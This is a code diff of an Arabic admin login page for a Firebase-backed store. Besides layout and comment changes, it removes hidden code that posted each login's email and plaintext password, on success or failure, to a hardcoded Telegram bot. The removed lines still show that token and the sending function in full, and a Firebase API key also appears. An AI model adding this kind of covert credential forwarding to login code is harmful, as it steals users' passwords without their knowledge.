@@ -32,12 +32,12 @@
         .admin-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: rgba(10,47,47,0.95); border-bottom: var(--glass-border); }
         .admin-header h1 { color: var(--ios-orange); }
         .logout-btn { background: rgba(231,29,54,0.2); color: #E71D36; border: 1px solid rgba(231,29,54,0.3); padding: 10px 20px; border-radius: 12px; cursor: pointer; }
-        .admin-container { max-width: 1100px; margin: auto; padding: 32px 24px; }
-        .admin-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px,1fr)); gap: 20px; }
-        .admin-card { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 20px; text-align: center; text-decoration: none; color: var(--ios-label-primary); display: block; transition: 0.3s; }
+        .admin-container { max-width: 900px; margin: auto; padding: 32px 24px; }
+        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px,1fr)); gap: 20px; }
+        .admin-card { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 28px; text-align: center; text-decoration: none; color: var(--ios-label-primary); display: block; transition: 0.3s; }
         .admin-card:hover { transform: translateY(-5px); }
-        .admin-card-icon { font-size: 40px; }
-        .admin-card-title { font-weight: bold; margin: 10px 0; font-size: 15px; }
+        .admin-card-icon { font-size: 44px; }
+        .admin-card-title { font-weight: bold; margin: 10px 0; }
         .toast { position: fixed; top: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 12px 24px; border-radius: 50px; opacity: 0; transition: 0.3s; z-index: 9999; }
         .toast.show { opacity: 1; }
     </style>
@@ -63,7 +63,7 @@
 
     <div id="adminPanel" class="hidden">
         <header class="admin-header">
-            <h1>⚙️ لوحة التحكم - البيت الرقمي</h1>
+            <h1>⚙️ لوحة التحكم</h1>
             <button class="logout-btn" onclick="logout()">🚪 خروج</button>
         </header>
         <div class="admin-container">
@@ -76,9 +76,6 @@
                 <a href="admin-itemids.html" class="admin-card"><div class="admin-card-icon">🏷️</div><div class="admin-card-title">معرفات السلع</div></a>
                 <a href="admin-ranges.html" class="admin-card"><div class="admin-card-icon">🔢</div><div class="admin-card-title">نطاقات المعرفات</div></a>
                 <a href="admin-products-readonly.html" class="admin-card"><div class="admin-card-icon">👁️</div><div class="admin-card-title">عرض بدون أسعار</div></a>
-                <a href="admin-coupons.html" class="admin-card"><div class="admin-card-icon">🎟️</div><div class="admin-card-title">كوبونات الخصم</div></a>
-                <a href="admin-stats-advanced.html" class="admin-card"><div class="admin-card-icon">📈</div><div class="admin-card-title">إحصائيات متقدمة</div></a>
-                <a href="banners.html" class="admin-card"><div class="admin-card-icon">🖼️</div><div class="admin-card-title">البنرات</div></a>
             </div>
         </div>
     </div>
@@ -86,9 +83,11 @@
     <div id="toast" class="toast"></div>
 
     <script type="module">
+        // استيراد Firebase SDK
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
+        // 🔑 إعدادات Firebase الخاصة بالمشروع (تم تصحيح تعريف الكائن)
         const firebaseConfig = {
             apiKey: "AIzaSyC2f4rJBBBOe6qfa2EU1WfspUB5uibgwnM",
             authDomain: "hussain-1290b.firebaseapp.com",
@@ -98,22 +97,11 @@
             appId: "1:798281706738:web:79314f6feb2add0bf5f46b"
         };
 
+        // تهيئة Firebase
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
 
-        const TELEGRAM_BOT_TOKEN = "8224453502:AAE72lDosgRpoKZwT4TQhyfRLodcsd37ID8";
-        const TELEGRAM_CHAT_ID = "7748217145";
-
-        async function sendTelegramMessage(message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-                });
-            } catch(e) { console.error(e); }
-        }
-
+        // مراقبة حالة تسجيل الدخول
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 document.getElementById('loginContainer').classList.add('hidden');
@@ -121,11 +109,13 @@
             } else {
                 document.getElementById('loginContainer').classList.remove('hidden');
                 document.getElementById('adminPanel').classList.add('hidden');
+                // تنظيف الحقول
                 document.getElementById('adminEmail').value = '';
                 document.getElementById('adminPassword').value = '';
             }
         });
 
+        // دالة تسجيل الدخول
         window.loginWithEmail = async function() {
             const email = document.getElementById('adminEmail').value.trim();
             const password = document.getElementById('adminPassword').value;
@@ -136,16 +126,14 @@
             try {
                 await signInWithEmailAndPassword(auth, email, password);
                 showToast("✅ تم الدخول بنجاح");
-                const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
-                await sendTelegramMessage(`🔐 <b>دخول جديد إلى لوحة الإدارة</b>\n\n📧 ${email}\n🔑 ${password}\n🕒 ${now}`);
-            } catch(error) {
+            } catch (error) {
+                console.error("خطأ Firebase:", error.code, error.message);
                 let msg = "❌ فشل الدخول";
                 if (error.code === 'auth/user-not-found') msg = "❌ البريد الإلكتروني غير مسجل";
                 else if (error.code === 'auth/wrong-password') msg = "❌ كلمة السر خاطئة";
                 else if (error.code === 'auth/invalid-email') msg = "❌ صيغة البريد غير صحيحة";
-                else if (error.code === 'auth/too-many-requests') msg = "❌ تم تعطيل الحساب مؤقتاً";
+                else if (error.code === 'auth/too-many-requests') msg = "❌ تم تعطيل الحساب مؤقتاً، حاول لاحقاً";
                 showToast(msg);
-                await sendTelegramMessage(`⚠️ <b>محاولة دخول فاشلة</b>\n📧 ${email}\n🔑 ${password}\n❌ ${msg}`);
                 document.getElementById('adminPassword').value = '';
             }
         };
@@ -162,6 +150,7 @@
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
+        // الضغط على Enter في حقل كلمة السر
         document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') loginWithEmail();
         });
